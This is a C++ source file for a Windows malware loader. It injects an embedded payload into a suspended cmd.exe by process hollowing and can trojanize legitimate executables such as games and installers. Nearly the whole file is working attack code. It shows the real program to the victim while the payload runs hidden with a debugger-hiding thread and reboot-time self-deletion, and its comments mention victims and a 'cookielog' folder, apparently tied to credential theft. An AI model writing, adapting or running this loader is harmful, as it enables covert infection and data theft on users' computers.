// loader.cpp - process hollowing injector for any .exe the attacker chooses.
//
//   loader.exe -p C:\tools\Host.exe [--kill] [--purge] [-t 60000]
//   -t wait N ms for payload to finish; --kill terminate host after; --purge delete file on reboot
//
//   Standalone mode (infected .exe): when loader.exe itself has a host appended
//   [loader.exe][host.exe bytes][host_len:4 LE][magic "CKLG":4]
//   it extracts the original host, launches it normally (installer/GUI appears),
//   and runs the payload silently via process hollowing -- no visible window.
#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0600
#if defined(_WIN32) || defined(_WIN64)
    #if defined(__has_include)
        #if __has_include(<windows.h>)
            #include <windows.h>
        #elif __has_include(<Windows.h>)
            #include <Windows.h>
        #else
            #error "Windows SDK headers not found. Configure the Windows SDK / MinGW include path."
        #endif
    #else
        #include <windows.h>
    #endif
#else
    #error "This source requires a Windows target."
#endif
#include <stdio.h>
#include <stdlib.h>
#include "payload.h"                 // extern unsigned char g_payload[]; extern unsigned g_payload_len;

// GUI subsystem: no console window when the victim double-clicks the infected exe
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:wmainCRTStartup")

typedef LONG (WINAPI *tUnmap)(HANDLE,PVOID);
typedef LONG (WINAPI *tNCTE)(HANDLE*,ACCESS_MASK,PVOID,PVOID,PVOID,PVOID,ULONG,ULONG,ULONG,ULONG,PVOID);

static PIMAGE_DOS_HEADER Mz(void* b){ return (PIMAGE_DOS_HEADER)b; }
static PIMAGE_NT_HEADERS Nt(void* b){
    PIMAGE_DOS_HEADER d=Mz(b); if(d->e_magic!=IMAGE_DOS_SIGNATURE) return NULL;
    PIMAGE_NT_HEADERS n=(PIMAGE_NT_HEADERS)((BYTE*)b+d->e_lfanew);
    return n->Signature==IMAGE_NT_SIGNATURE ? n : NULL;
}
static bool IsClr(void* b){ PIMAGE_NT_HEADERS n=Nt(b); return n && n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress!=0; }

// Convert RVA (relative virtual address) to raw file offset (in g_payload buffer)
static DWORD Rva2Off(PIMAGE_NT_HEADERS nt, DWORD rva){
    PIMAGE_SECTION_HEADER sec=IMAGE_FIRST_SECTION(nt);
    for(WORD i=0;i<nt->FileHeader.NumberOfSections;i++,sec++){
        if(rva>=sec->VirtualAddress && rva<sec->VirtualAddress+sec->Misc.VirtualSize)
            return rva-sec->VirtualAddress+sec->PointerToRawData;
    }
    return rva; // fallback: 1:1 mapping
}

int wmain(int argc,wchar_t** argv){
    wchar_t* target=NULL; bool kill=false, purge=false; DWORD wait=5000;
    static wchar_t target_buf[MAX_PATH];               // buffer for standalone mode
    for(int i=1;i<argc;i++){
        if(!lstrcmpW(argv[i],L"-p")&&i+1<argc) target=argv[++i];
        else if(!lstrcmpW(argv[i],L"--kill")) kill=true;
        else if(!lstrcmpW(argv[i],L"--purge")) purge=true;
        else if(!lstrcmpW(argv[i],L"-t")&&i+1<argc) wait=(DWORD)_wtoi(argv[++i]);
    }

    // Standalone mode: if no -p target given, look for a host exe appended to this exe.
    // Format: [loader.exe][host.exe bytes][host_len:4 LE][magic "CKLG":4]
    // Flow: extract original host -> launch normally (game/installer appears) ->
    //       hollow a sacrificial cmd.exe with the payload -> payload runs hidden
    if(!target){
        wchar_t self[MAX_PATH]; GetModuleFileNameW(NULL,self,MAX_PATH);
        HANDLE hs=CreateFileW(self,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
        if(hs!=INVALID_HANDLE_VALUE){
            LARGE_INTEGER fsize; GetFileSizeEx(hs,&fsize);
            bool found=false;
            if(fsize.QuadPart>12){
                LARGE_INTEGER pos; pos.QuadPart=fsize.QuadPart-8;
                SetFilePointerEx(hs,pos,NULL,FILE_BEGIN);
                BYTE tail[8]; DWORD rd2=0; ReadFile(hs,tail,8,&rd2,NULL);
                if(rd2==8 && tail[4]=='C' && tail[5]=='K' && tail[6]=='L' && tail[7]=='G'){
                    DWORD host_len=*(DWORD*)tail;
                    if(host_len>0 && host_len<(DWORD)(fsize.QuadPart-8)){
                        // 1. Extract original host bytes
                        pos.QuadPart=fsize.QuadPart-8-host_len;
                        SetFilePointerEx(hs,pos,NULL,FILE_BEGIN);
                        BYTE* hbuf=(BYTE*)VirtualAlloc(NULL,host_len,MEM_COMMIT,PAGE_READWRITE);
                        DWORD r3=0; ReadFile(hs,hbuf,host_len,&r3,NULL);
                        CloseHandle(hs); found=true;

                        // 2. Rename-restore: rename the infected .exe to a hidden temp,
                        //    and write the original host bytes back to the ORIGINAL filename.
                        //    Reason: Unity games derive their data path from the exe name
                        //    (they look for <name>_Data/). If we extract as ~ck_tmp.exe,
                        //    Unity looks for ~ck_tmp_Data/ and fails.
                        //    With rename-restore, the host runs with its original name
                        //    and finds <name>_Data/, UnityPlayer.dll, etc.

                        // Directory of the infected .exe
                        wchar_t wdir[MAX_PATH]; lstrcpyW(wdir,self);
                        wchar_t* s2=wdir+lstrlenW(wdir);
                        while(s2>wdir && s2[-1]!=L'\\') s2--;
                        *s2=0;

                        // Temp name to stash the infected exe: <dir>\~ck_bak.bin
                        wchar_t bak[MAX_PATH]; lstrcpyW(bak,wdir);
                        lstrcatW(bak,L"~ck_bak.bin");
                        DeleteFileW(bak);

                        // Original .exe name (self) = where we write the clean host
                        wchar_t origName[MAX_PATH]; lstrcpyW(origName,self);

                        // Rename infected -> ~ck_bak.bin
                        // (may fail if AV blocks; in that case fall back to ~ck_tmp.exe)
                        BOOL renamed = MoveFileExW(origName,bak,MOVEFILE_REPLACE_EXISTING);

                        wchar_t runExe[MAX_PATH];
                        if(renamed){
                            // Write original host to the original filename
                            HANDLE horig=CreateFileW(origName,GENERIC_WRITE,0,NULL,
                                                     CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
                            if(horig!=INVALID_HANDLE_VALUE){
                                WriteFile(horig,hbuf,host_len,&r3,NULL); CloseHandle(horig);
                            }
                            lstrcpyW(runExe,origName);
                        } else {
                            // Fallback: extract as ~ck_tmp.exe (works for apps that
                            // don't depend on the exe name)
                            lstrcpyW(runExe,wdir); lstrcatW(runExe,L"~ck_tmp.exe");
                            HANDLE htmp=CreateFileW(runExe,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,
                                                    FILE_ATTRIBUTE_HIDDEN,NULL);
                            if(htmp!=INVALID_HANDLE_VALUE){
                                WriteFile(htmp,hbuf,host_len,&r3,NULL); CloseHandle(htmp);
                            }
                        }
                        VirtualFree(hbuf,0,MEM_RELEASE);

                        // 3. Launch original host normally (game/installer/GUI appears)
                        //    Working directory = directory of the infected .exe
                        STARTUPINFOW si2={sizeof(si2)};
                        si2.dwFlags=STARTF_USESHOWWINDOW;
                        si2.wShowWindow=SW_SHOWNORMAL;
                        PROCESS_INFORMATION pi2; memset(&pi2,0,sizeof(pi2));
                        BOOL hp=CreateProcessW(runExe,NULL,NULL,NULL,FALSE,
                                       CREATE_DEFAULT_ERROR_MODE,NULL,wdir,&si2,&pi2);
                        if(!hp){
                            CreateDirectoryW(L"C:\\ProgramData\\cookielog",NULL);
                            HANDLE el=CreateFileW(L"C:\\ProgramData\\cookielog\\loader_err.log",
                                GENERIC_WRITE,0,NULL,OPEN_ALWAYS,0,NULL);
                            if(el!=INVALID_HANDLE_VALUE){
                                SetFilePointer(el,0,NULL,FILE_END);
                                char msg[300]; int n=wsprintfA(msg,
                                    "CreateProcessW host failed: err=%u path=%S\r\n",
                                    GetLastError(),runExe);
                                DWORD w2; WriteFile(el,msg,n,&w2,NULL); CloseHandle(el);
                            }
                        }
                        if(pi2.hProcess){ CloseHandle(pi2.hThread); CloseHandle(pi2.hProcess); }

                        // 3b. Clean up the temp file
                        if(renamed){
                            // ~ck_bak.bin: delete now or schedule for reboot
                            if(!DeleteFileW(bak))
                                MoveFileExW(bak,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
                        } else {
                            if(!DeleteFileW(runExe))
                                MoveFileExW(runExe,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
                        }

                        // 4. Sacrificial process for hollowing: cmd.exe from System32
                        //    Created SUSPENDED -> code replaced with payload -> never shows a window
                        GetSystemDirectoryW(target_buf,MAX_PATH);
                        lstrcatW(target_buf,L"\\cmd.exe");
                        target=target_buf; kill=true;
                        wait=20000;    // payload needs ~10s (pipe retry) + extraction time
                        // falls through to hollowing code below
                    }
                }
            }
            if(!found) CloseHandle(hs);
        }
    }

    if(!target){
        // Should never happen in standalone mode, but keep for CLI usage
        return 1;
    }

    // 1. Host must be a native PE64 (no .NET / PyInstaller / 32-bit)
    HANDLE hf = CreateFileW(target,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE){ return 2; }
    BYTE hdr[4096]; DWORD rd=0; ReadFile(hf,hdr,sizeof(hdr),&rd,NULL);
    PIMAGE_NT_HEADERS hn=Nt(hdr);
    if(!hn){ return 2; }
    if(hn->FileHeader.Machine!=IMAGE_FILE_MACHINE_AMD64){ return 2; }
    CloseHandle(hf);
    if(purge) MoveFileExW(target,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);

    // 2. Create sacrificial process in suspended state
    STARTUPINFOW si={sizeof(si)}; PROCESS_INFORMATION pi;
    si.dwFlags=STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE;
    if(!CreateProcessW(target,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED|CREATE_BREAKAWAY_FROM_JOB,NULL,NULL,&si,&pi)){
        return 3; }

    // 3. Unmap the host's original code (NtUnmapViewOfSection)
    PIMAGE_NT_HEADERS pn=Nt(g_payload);
    HMODULE nt=GetModuleHandleA("ntdll.dll");
    tUnmap unmap=(tUnmap)GetProcAddress(nt,"NtUnmapViewOfSection");
    if(unmap) unmap(pi.hProcess,(PVOID)(ULONG_PTR)hn->OptionalHeader.ImageBase);

    // 4. Map the payload at its fixed base (compiled /DYNAMICBASE:NO -> no relocation needed)
    SIZE_T sz=pn->OptionalHeader.SizeOfImage;
    PVOID base=VirtualAllocEx(pi.hProcess,(PVOID)(ULONG_PTR)pn->OptionalHeader.ImageBase,sz,
                              MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);
    if(!base){ TerminateProcess(pi.hProcess,0); return 4; }
    SIZE_T wr=0;
    WriteProcessMemory(pi.hProcess,base,g_payload,pn->OptionalHeader.SizeOfHeaders,&wr);
    PIMAGE_SECTION_HEADER sh=IMAGE_FIRST_SECTION(pn);
    for(WORD i=0;i<pn->FileHeader.NumberOfSections;i++,sh++){
        if(!sh->SizeOfRawData) continue;
        WriteProcessMemory(pi.hProcess,(BYTE*)base+sh->VirtualAddress,
                           g_payload+sh->PointerToRawData,sh->SizeOfRawData,&wr);
    }

    // 5. Fix IAT: only system DLLs, which have the SAME base in every process of this session
    //    Read descriptors from g_payload (local buffer), not from base (target process memory)
    DWORD imp_rva=pn->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if(imp_rva){
        PIMAGE_IMPORT_DESCRIPTOR imp=(PIMAGE_IMPORT_DESCRIPTOR)(g_payload+Rva2Off(pn,imp_rva));
        while(imp->Name){
            const char* dllname=(const char*)(g_payload+Rva2Off(pn,imp->Name));
            HMODULE m=LoadLibraryA(dllname); if(!m) break;
            DWORD th_rva=imp->FirstThunk;
            DWORD o_rva=imp->OriginalFirstThunk?imp->OriginalFirstThunk:imp->FirstThunk;
            PIMAGE_THUNK_DATA o_local=(PIMAGE_THUNK_DATA)(g_payload+Rva2Off(pn,o_rva));
            for(DWORD idx=0;o_local[idx].u1.AddressOfData;idx++){
                FARPROC a;
                if(IMAGE_SNAP_BY_ORDINAL(o_local[idx].u1.Ordinal))
                    a=GetProcAddress(m,(LPCSTR)IMAGE_ORDINAL(o_local[idx].u1.Ordinal));
                else{
                    DWORD hint_rva=(DWORD)o_local[idx].u1.AddressOfData;
                    PIMAGE_IMPORT_BY_NAME ib=(PIMAGE_IMPORT_BY_NAME)(g_payload+Rva2Off(pn,hint_rva));
                    a=GetProcAddress(m,ib->Name);
                }
                ULONG_PTR v=(ULONG_PTR)a;
                PVOID remote_thunk=(BYTE*)base+th_rva+idx*sizeof(IMAGE_THUNK_DATA);
                WriteProcessMemory(pi.hProcess,remote_thunk,&v,sizeof(v),&wr);
            }
            imp++;
        }
    }

    // 6. Set per-section memory protection (no global RWX) and create hidden thread
    sh=IMAGE_FIRST_SECTION(pn);
    for(WORD i=0;i<pn->FileHeader.NumberOfSections;i++,sh++){
        DWORD p=PAGE_READONLY,f=sh->Characteristics;
        if(f&IMAGE_SCN_MEM_EXECUTE) p=(f&IMAGE_SCN_MEM_WRITE)?PAGE_EXECUTE_READWRITE:PAGE_EXECUTE_READ;
        else if(f&IMAGE_SCN_MEM_WRITE) p=PAGE_READWRITE;
        VirtualProtectEx(pi.hProcess,(BYTE*)base+sh->VirtualAddress,sh->Misc.VirtualSize,p,&p);
    }
    HANDLE th=NULL;
    tNCTE ncte=(tNCTE)GetProcAddress(nt,"NtCreateThreadEx");
    ULONG_PTR arg=1;                                    // DLL_PROCESS_ATTACH
    BOOL spawned=FALSE;
    if(ncte) spawned = ncte(&th,THREAD_ALL_ACCESS,NULL,pi.hProcess,
                            (PVOID)((BYTE*)base+pn->OptionalHeader.AddressOfEntryPoint),
                            (PVOID)arg,NULL,0x1/*HIDE_FROM_DEBUGGER*/,0,0,NULL) >= 0;
    if(!spawned){                                       // fallback: standard remote thread
        th=CreateRemoteThread(pi.hProcess,NULL,0,
            (LPTHREAD_START_ROUTINE)((BYTE*)base+pn->OptionalHeader.AddressOfEntryPoint),
            (PVOID)arg,0,&pi.dwThreadId); spawned=(th!=NULL);
    }
    if(!spawned){ TerminateProcess(pi.hProcess,0); return 5; }

    // 7. Payload does its work on the remote thread.
    //    DO NOT resume the main thread -- the original entry point was unmapped
    //    by NtUnmapViewOfSection; resuming causes an access violation that kills the
    //    entire process (and the payload with it). The remote thread runs on its own.
    WaitForSingleObject(th,wait);
    if(kill) TerminateProcess(pi.hProcess,0);
    CloseHandle(th); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    return 0;
}
